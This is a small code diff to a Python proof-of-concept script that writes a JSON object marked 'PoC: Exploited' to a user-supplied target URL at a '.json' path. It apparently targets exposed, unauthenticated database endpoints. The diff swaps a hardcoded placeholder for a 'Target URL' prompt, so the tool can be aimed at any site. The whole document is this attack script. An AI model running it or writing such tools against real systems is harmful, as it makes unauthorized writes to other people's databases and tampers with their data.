@@ -1,6 +1,7 @@
 import requests
 hacker = input("PoC Name: ")
-url = f"[URL Here]/{hacker}.json"
+target = input("Target URL: ")
+url = f"{target}/{hacker}.json"
 data= {"PoC":"Exploited", "BY": hacker}
 reponse = requests.put(url, json=data)
 
